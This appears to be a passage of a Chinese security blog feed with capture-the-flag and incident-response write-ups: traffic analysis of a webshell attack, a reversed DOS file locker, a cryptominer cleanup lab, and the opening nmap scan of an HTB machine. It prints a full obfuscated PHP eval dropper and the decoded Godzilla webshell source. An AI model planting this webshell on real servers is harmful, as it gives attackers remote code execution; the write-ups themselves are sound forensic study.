    <content type="html"><![CDATA[<h1 id="Wireshark"><a href="#Wireshark" class="headerlink" title="Wireshark"></a>Wireshark</h1><p>查看流量包内容发现</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">pass=<span class="hljs-keyword">eval</span>%<span class="hljs-number">28</span>base64_decode%<span class="hljs-number">28</span>strrev%<span class="hljs-number">28</span>urldecode%<span class="hljs-number">28</span>%<span class="hljs-number">27</span>K0QfK0QfgACIgoQD9BCIgACIgACIK0wOpkXZrRCLhRXYkRCKlR2bj5WZ90VZtFmTkF2bslXYwRyWO9USTNVRT9FJgACIgACIgACIgACIK0wepU2csFmZ90TIpIybm5WSzNWazFmQ0V2ZiwSY0FGZkgycvBnc0NHKgYWagACIgACIgAiCNsXZzxWZ9BCIgAiCNsTK2EDLpkXZrRiLzNXYwRCK1QWboIHdzJWdzByboNWZgACIgACIgAiCNsTKpkXZrRCLpEGdhRGJo4WdyBEKlR2bj5WZoUGZvNmbl9FN2U2chJGIvh2YlBCIgACIgACIK0wOpYTMsADLpkXZrRiLzNXYwRCK1QWboIHdzJWdzByboNWZgACIgACIgAiCNsTKkF2bslXYwRCKsFmdllQCK0QfgACIgACIgAiCNsTK5V2akwCZh9Gb5FGckgSZk92YuVWPkF2bslXYwRCIgACIgACIgACIgAiCNsXKlNHbhZWP90TKi8mZul0cjl2chJEdldmIsQWYvxWehBHJoM3bwJHdzhCImlGIgACIgACIgoQD7kSeltGJs0VZtFmTkF2bslXYwRyWO9USTNVRT9FJoUGZvNmbl1DZh9Gb5FGckACIgACIgACIK0wepkSXl1WYORWYvxWehBHJb50TJN1UFN1XkgCdlN3cphCImlGIgACIK0wOpkXZrRCLp01czFGcksFVT9EUfRCKlR2bjVGZfRjNlNXYihSZk92YuVWPhRXYkRCIgACIK0wepkSXzNXYwRyWUN1TQ9FJoQXZzNXaoAiZppQD7ciMhZ2MxImM2MzY0QjZmVGMn0TeltGJK0wOnQWYvxWehB3J9UWbh5EZh9Gb5FGckoQD7cyYkV2M4N3dyoXYxFzJ9M3chBHJK0QfK0wOERCIuJXd0VmcgACIgoQD9BCIgAiCNszYk4VXpRyWERCI9ASXpRyWERCIgACIgACIgoQD70VNxYSMrkGJbtEJg0DIjRCIgACIgACIgoQD7BSKrsSaksTKERCKuVGbyR3c8kGJ7ATPpRCKy9mZgACIgoQD7lySkwCRkgSZk92YuVGIu9Wa0Nmb1ZmCNsTKwgyZulGdy9GclJ3Xy9mcyVGQK0wOpADK0lWbpx2Xl1Wa09FdlNHQK0wOpgCdyFGdz9lbvl2czV2cApQD%<span class="hljs-number">27</span>%<span class="hljs-number">29</span>%<span class="hljs-number">29</span>%<span class="hljs-number">29</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>B&amp;<span class="hljs-number">1</span>qaz2wsx3edc=eu1uNDRjMzYyYjz%<span class="hljs-number">2</span>Bu2uwAH1mNsWC9MvudxUD4GxD2vZHYhmcslPc4AT6kvwn72TiprEftRcyZvWaASZ2twUSoSXCZHZrgXp1OrZJTzbT5eJdLiAUCd1%<span class="hljs-number">2</span>BqUmpgl2Orlfucw%<span class="hljs-number">2</span>BsWVNIRc8GzsXv8ODt4jV5jXn%<span class="hljs-number">2</span>FLQCpCbmD2OihJd4HtL0BEOlzQGrMYUiFNRFgou2Zmus5JThj7ts0VATS5%<span class="hljs-number">2</span>FBmZjQ%<span class="hljs-number">3</span>D<br></code></pre></td></tr></table></figure><p>解密 webshell 内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> base64<br><br>data = <span class="hljs-string">&quot;K0QfK0QfgACIgoQD9BCIgACIgACIK0wOpkXZrRCLhRXYkRCKlR2bj5WZ90VZtFmTkF2bslXYwRyWO9USTNVRT9FJgACIgACIgACIgACIK0wepU2csFmZ90TIpIybm5WSzNWazFmQ0V2ZiwSY0FGZkgycvBnc0NHKgYWagACIgACIgAiCNsXZzxWZ9BCIgAiCNsTK2EDLpkXZrRiLzNXYwRCK1QWboIHdzJWdzByboNWZgACIgACIgAiCNsTKpkXZrRCLpEGdhRGJo4WdyBEKlR2bj5WZoUGZvNmbl9FN2U2chJGIvh2YlBCIgACIgACIK0wOpYTMsADLpkXZrRiLzNXYwRCK1QWboIHdzJWdzByboNWZgACIgACIgAiCNsTKkF2bslXYwRCKsFmdllQCK0QfgACIgACIgAiCNsTK5V2akwCZh9Gb5FGckgSZk92YuVWPkF2bslXYwRCIgACIgACIgACIgAiCNsXKlNHbhZWP90TKi8mZul0cjl2chJEdldmIsQWYvxWehBHJoM3bwJHdzhCImlGIgACIgACIgoQD7kSeltGJs0VZtFmTkF2bslXYwRyWO9USTNVRT9FJoUGZvNmbl1DZh9Gb5FGckACIgACIgACIK0wepkSXl1WYORWYvxWehBHJb50TJN1UFN1XkgCdlN3cphCImlGIgACIK0wOpkXZrRCLp01czFGcksFVT9EUfRCKlR2bjVGZfRjNlNXYihSZk92YuVWPhRXYkRCIgACIK0wepkSXzNXYwRyWUN1TQ9FJoQXZzNXaoAiZppQD7ciMhZ2MxImM2MzY0QjZmVGMn0TeltGJK0wOnQWYvxWehB3J9UWbh5EZh9Gb5FGckoQD7cyYkV2M4N3dyoXYxFzJ9M3chBHJK0QfK0wOERCIuJXd0VmcgACIgoQD9BCIgAiCNszYk4VXpRyWERCI9ASXpRyWERCIgACIgACIgoQD70VNxYSMrkGJbtEJg0DIjRCIgACIgACIgoQD7BSKrsSaksTKERCKuVGbyR3c8kGJ7ATPpRCKy9mZgACIgoQD7lySkwCRkgSZk92YuVGIu9Wa0Nmb1ZmCNsTKwgyZulGdy9GclJ3Xy9mcyVGQK0wOpADK0lWbpx2Xl1Wa09FdlNHQK0wOpgCdyFGdz9lbvl2czV2cApQD&quot;</span><br>decoded = base64.b64decode(data[::-<span class="hljs-number">1</span>])<br><span class="hljs-built_in">print</span>(decoded.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>, errors=<span class="hljs-string">&#x27;ignore&#x27;</span>))<br></code></pre></td></tr></table></figure><p>拿到的是哥斯拉流量</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php">@<span class="hljs-title function_ invoke__">session_start</span>();<br>@<span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br>@<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">encode</span>(<span class="hljs-params"><span class="hljs-variable">$D</span>,<span class="hljs-variable">$K</span></span>)</span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$D</span>);<span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$c</span> = <span class="hljs-variable">$K</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>&amp;<span class="hljs-number">15</span>];<br>        <span class="hljs-variable">$D</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$D</span>[<span class="hljs-variable">$i</span>]^<span class="hljs-variable">$c</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$D</span>;<br>&#125;<br><span class="hljs-variable">$pass</span>=<span class="hljs-string">&#x27;1qaz2wsx3edc&#x27;</span>;<br><span class="hljs-variable">$payloadName</span>=<span class="hljs-string">&#x27;payload&#x27;</span>;<br><span class="hljs-variable">$key</span>=<span class="hljs-string">&#x27;0eff44c362b13fa2&#x27;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-variable">$pass</span>]))&#123;<br>    <span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-variable">$pass</span>]),<span class="hljs-variable">$key</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-variable">$payloadName</span>]))&#123;<br>        <span class="hljs-variable">$payload</span>=<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-variable">$payloadName</span>],<span class="hljs-variable">$key</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$payload</span>,<span class="hljs-string">&quot;getBasicsInfo&quot;</span>)===<span class="hljs-literal">false</span>)&#123;<br>            <span class="hljs-variable">$payload</span>=<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-variable">$payload</span>,<span class="hljs-variable">$key</span>);<br>        &#125;<br>                <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$payload</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$pass</span>.<span class="hljs-variable">$key</span>),<span class="hljs-number">0</span>,<span class="hljs-number">16</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">encode</span>(@<span class="hljs-title function_ invoke__">run</span>(<span class="hljs-variable">$data</span>),<span class="hljs-variable">$key</span>));<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$pass</span>.<span class="hljs-variable">$key</span>),<span class="hljs-number">16</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$data</span>,<span class="hljs-string">&quot;getBasicsInfo&quot;</span>)!==<span class="hljs-literal">false</span>)&#123;<br>            <span class="hljs-variable">$_SESSION</span>[<span class="hljs-variable">$payloadName</span>]=<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-variable">$data</span>,<span class="hljs-variable">$key</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Cyber 解密</p><p><img src="https://img.dkdun.cn/v1/2025/12/38ea55dbce7a8e4f.png"></p><p>将密文提取出来 base64 解密</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;ccebdb78-<span class="hljs-number">4</span>b5c-<span class="hljs-number">4252</span>-b20a-<span class="hljs-number">0039913</span>c5c94&#125;<br></code></pre></td></tr></table></figure><h1 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h1><p>ida 看汇编流程</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gcode">文件头写 <span class="hljs-string">&quot;ZX_LOCK&quot;</span> 和一个字节（取决于 word_<span class="hljs-number">1023</span>E &amp; <span class="hljs-number">1</span>）<br>获取系统时钟 <span class="hljs-comment">(int 1Ah)</span>，得到一个 seed <span class="hljs-comment">(di)</span><br>从 FLAG.TXT 读到 u<span class="hljs-symbol">nk_1012</span>A，对每两个字节执行一系列加密变换<br>把 seed <span class="hljs-comment">(word_1022A)</span> 和加密后的数据写入 FLAG.E<span class="hljs-symbol">NC</span><br></code></pre></td></tr></table></figure><p>gpt 秒了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">data: <span class="hljs-built_in">bytes</span>, seed: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br><br>    result = <span class="hljs-built_in">bytearray</span>()<br>    di = seed<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(data), <span class="hljs-number">2</span>):<br>        ax = <span class="hljs-built_in">int</span>.from_bytes(data[i:i+<span class="hljs-number">2</span>], <span class="hljs-string">&quot;little&quot;</span>)<br>        di = (di + <span class="hljs-number">0xFADE</span>) &amp; <span class="hljs-number">0xFFFF</span><br>        cx = ax &amp; di<br>        cx = (~cx) &amp; <span class="hljs-number">0xFFFF</span><br>        dx = ax &amp; cx<br>        dx = (~dx) &amp; <span class="hljs-number">0xFFFF</span><br>        tmp_ax = dx<br>        dx = di &amp; cx<br>        dx = (~dx) &amp; <span class="hljs-number">0xFFFF</span><br>        tmp_ax = tmp_ax &amp; dx<br>        tmp_ax = (~tmp_ax) &amp; <span class="hljs-number">0xFFFF</span><br>        result.extend(tmp_ax.to_bytes(<span class="hljs-number">2</span>, <span class="hljs-string">&quot;little&quot;</span>))<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(result)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_flag_enc</span>(<span class="hljs-params">filename=<span class="hljs-string">&quot;FLAG.ENC&quot;</span></span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        content = f.read()<br><br>    <span class="hljs-keyword">assert</span> content.startswith(<span class="hljs-string">b&quot;ZX_LOCK&quot;</span>)<br>    mode = content[<span class="hljs-number">7</span>]<br>    seed = <span class="hljs-built_in">int</span>.from_bytes(content[<span class="hljs-number">8</span>:<span class="hljs-number">10</span>], <span class="hljs-string">&quot;little&quot;</span>)<br>    enc_data = content[<span class="hljs-number">10</span>:]<br><br>    dec = decrypt(enc_data, seed)<br><br>    <span class="hljs-keyword">if</span> mode == <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> dec[-<span class="hljs-number">1</span>] == <span class="hljs-number">0</span>:<br>        dec = dec[:-<span class="hljs-number">1</span>]<br><br>    <span class="hljs-keyword">return</span> dec.decode(errors=<span class="hljs-string">&quot;ignore&quot;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    flag = parse_flag_enc(<span class="hljs-string">&quot;FLAG.ENC&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Decrypted FLAG:&quot;</span>, flag)<br></code></pre></td></tr></table></figure><p>flag</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">flag&#123;D0s_L0ck3r_WitH_n4Nd_ExpRs!<span class="hljs-string">|solarsec_202509&#125;</span><br></code></pre></td></tr></table></figure><h1 id="特洛伊挖矿木马事件排查"><a href="#特洛伊挖矿木马事件排查" class="headerlink" title="特洛伊挖矿木马事件排查"></a>特洛伊挖矿木马事件排查</h1><h2 id="任务一"><a href="#任务一" class="headerlink" title="任务一"></a>任务一</h2><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">任务名称：提交挖矿文件的绝对路径</span><br><span class="language-xml">任务分数：100.00</span><br><span class="language-xml">任务类型：静态Flag</span><br><span class="language-xml">提交挖矿文件的绝对路径，最终以flag</span><span class="hljs-template-tag">&#123;/<span class="hljs-name">xxx</span>/xxx&#125;</span><span class="language-xml">格式提交</span><br></code></pre></td></tr></table></figure><p>查找 CPU 占用率顺序</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ps aux --<span class="hljs-built_in">sort</span>=-%cpu | <span class="hljs-built_in">head</span> -20<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/c9a46f60adaf983a.png"></p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-tag">&#123;/<span class="hljs-name">tmp</span>/kworkerds&#125;</span><br></code></pre></td></tr></table></figure><h2 id="任务二"><a href="#任务二" class="headerlink" title="任务二"></a>任务二</h2><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs armasm">任务名称：提交挖矿文件的外联<span class="hljs-built_in">IP</span>与端口<br>任务分数：<span class="hljs-number">100</span>.<span class="hljs-number">00</span><br>任务类型：静态Flag<br>提交挖矿文件的外联的<span class="hljs-built_in">IP</span>与端口，最终以flag&#123;<span class="hljs-built_in">ip</span>:port&#125;格式提交<br></code></pre></td></tr></table></figure><p>根据 PID 查找外联</p><p><img src="https://img.dkdun.cn/v1/2025/12/c99181bfdf854fcd.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">104.21.6.99:10235</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="任务三"><a href="#任务三" class="headerlink" title="任务三"></a>任务三</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">任务名称：守护进程脚本的绝对路径<br>任务分数：<span class="hljs-number">100.00</span><br>任务类型：静态Flag<br>停止挖矿进程并尝试删除挖矿程序，根据异常判断，提交守护进程脚本的绝对路径，最终以flag&#123;<span class="hljs-regexp">/xxx/</span>xxx<span class="hljs-regexp">/xxx/</span>xxx&#125;提交<br></code></pre></td></tr></table></figure><p>查看 &#x2F;etc&#x2F;cron.d 目录下文件</p><p><img src="https://img.dkdun.cn/v1/2025/12/5a6998bffdc2d847.png"></p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-tag">&#123;/<span class="hljs-name">usr</span>/bin/.0guardian&#125;</span><br></code></pre></td></tr></table></figure><h2 id="任务四"><a href="#任务四" class="headerlink" title="任务四"></a>任务四</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">任务名称：异常处理<br>任务分数：<span class="hljs-number">100.00</span><br>任务类型：静态Flag<br>根据出现的异常及守护进程脚本，继续排查，以人为本，使用环境内浏览器访问：http:<span class="hljs-regexp">//</span>chat.internal-dev.net:<span class="hljs-number">8081</span> 获取可疑网址，最终以flag&#123;http:<span class="hljs-regexp">//</span>www.example.com&#125;格式提交<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/8c5850344710c382.png"></p><figure class="highlight roboconf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs roboconf">flag&#123;<span class="hljs-attribute">http</span>://www<span class="hljs-variable">.superlog-pro</span><span class="hljs-variable">.com</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="任务五"><a href="#任务五" class="headerlink" title="任务五"></a>任务五</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">任务名称：分析病毒文件<br>任务分数：<span class="hljs-number">100.00</span><br>任务类型：静态Flag<br>分析病毒文件，提交其感染的所有程序，最终以flag&#123;md5(<span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/whoai,/u</span>sr<span class="hljs-regexp">/bin/</span>ls,<span class="hljs-regexp">/usr/</span>bin/top)&#125;进行提交，顺序需以病毒文件中为准<br></code></pre></td></tr></table></figure><p>根据网站，在浏览器找到下载的程序</p><p><img src="https://img.dkdun.cn/v1/2025/12/baa6212da15e8df0.png"></p><p>查找程序中的字符串</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">strings setup<br></code></pre></td></tr></table></figure><p>拿到如下信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/bin/ls,/bin/ps,/bin/cat,/bin/rm,/bin/ss,/usr/bin/stat,/usr/bin/top,/usr/bin/wget,/usr/bin/curl,/usr/bin/vi,/usr/bin/sudo<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/dfdc24a567a7b984.png"></p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;dac48e98a53b81b0218e2156e364f7ba&#125;</span><br></code></pre></td></tr></table></figure><h2 id="任务六"><a href="#任务六" class="headerlink" title="任务六"></a>任务六</h2><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs groovy">任务名称：修复系统并恢复文件完整性<br>任务分数：<span class="hljs-number">100.00</span><br>任务类型：静态Flag<br>修复系统并恢复文件完整性：已知所有程序被感染，当前系统属于断网状态，所以作者贴心的在<span class="hljs-regexp">/deb_final目录下存放了对应程序的deb包，请尝试恢复所有程序，恢复完毕后在/</span><span class="hljs-keyword">var</span><span class="hljs-regexp">/flag/</span><span class="hljs-number">1</span>文件获取flag<br></code></pre></td></tr></table></figure><p>覆盖安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">dpkg -i --force-confnew /deb_final/*.deb || <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/d30860b70736d7db.png"></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">flag&#123;e<span class="hljs-number">510</span><span class="hljs-keyword">c</span><span class="hljs-number">5</span>fca<span class="hljs-number">680</span>b<span class="hljs-number">1</span>b<span class="hljs-number">4</span>bd<span class="hljs-number">5</span><span class="hljs-keyword">c</span><span class="hljs-number">9</span>d<span class="hljs-number">8</span>d<span class="hljs-number">6</span>b<span class="hljs-number">3</span>f<span class="hljs-number">4</span>bdc&#125;<br></code></pre></td></tr></table></figure><h2 id="任务七"><a href="#任务七" class="headerlink" title="任务七"></a>任务七</h2><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sqf">任务名称：最终清理<br>任务分数：<span class="hljs-number">100.00</span><br>任务类型：静态<span class="hljs-built_in">Flag</span><br>最终清理：删除挖矿程序、删除计划任务及守护进程及清除相关进程，等待片刻在/var/<span class="hljs-built_in">flag</span>/<span class="hljs-number">2</span>获取<span class="hljs-built_in">flag</span><br></code></pre></td></tr></table></figure><p>修复文件之后，删除守护文件</p><p><img src="https://img.dkdun.cn/v1/2025/12/36bbbd449ecc0bd8.png"></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">flag&#123;<span class="hljs-number">081</span>ce<span class="hljs-number">3688</span><span class="hljs-keyword">c</span><span class="hljs-number">6</span>cd<span class="hljs-number">6e2946125081381087</span><span class="hljs-keyword">c</span>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>应急响应&amp;取证</category>
      
    </categories>
    
    
    <tags>
      
      <tag>应急响应</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB-Soulmate</title>
    <link href="/2025/09/14/HTB-Soulmate/"/>
    <url>/2025/09/14/HTB-Soulmate/</url>
    
    <content type="html"><![CDATA[<p>难度：easy，没啥意思。文件上传拿 shell，再利用 Erlang 加载的 OS 模块命令执行</p><span id="more"></span><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─# nmap -sS -sV -A -Pn 10.10.11.86<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-14 19:47 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.11.86<br>Host is up (0.23s latency).<br>Not shown: 998 closed tcp ports (reset)<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey:<br>|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)<br>|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)<br>80/tcp open  http    nginx 1.18.0 (Ubuntu)<br>|_http-title: Did not follow redirect to http://soulmate.htb/<br>|_http-server-header: nginx/1.18.0 (Ubuntu)<br>No exact OS matches <span class="hljs-keyword">for</span> host (If you know what OS is running on it, see https://nmap.org/submit/ ).<br>TCP/IP fingerprint:<br>OS:SCAN(V=7.94SVN%E=4%D=9/14%OT=22%CT=1%CU=42823%PV=Y%DS=3%DC=T%G=Y%TM=68C6<br>OS:AB7A%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=10F%TI=Z%CI=Z)SEQ(SP=100<br>OS:%GCD=1%ISR=10F%TI=Z%CI=Z%TS=A)SEQ(SP=100%GCD=1%ISR=10F%TI=Z%CI=Z%II=I)SE<br>OS:Q(SP=100%GCD=1%ISR=10F%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M542ST11NW7%O2=M542ST1<br>OS:1NW7%O3=M542NNT11NW7%O4=M542ST11NW7%O5=M542ST11NW7%O6=M542ST11)WIN(W1=FE<br>OS:88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5<br>OS:42NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4<br>OS:(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%<br>OS:F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=<br>OS:Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=F279%RUD=G)IE(R=Y%DFI<br>OS:=N%T=40%CD=S)<br><br>Network Distance: 3 hops<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/db25d3c66d73e2fe.png"></p><h2 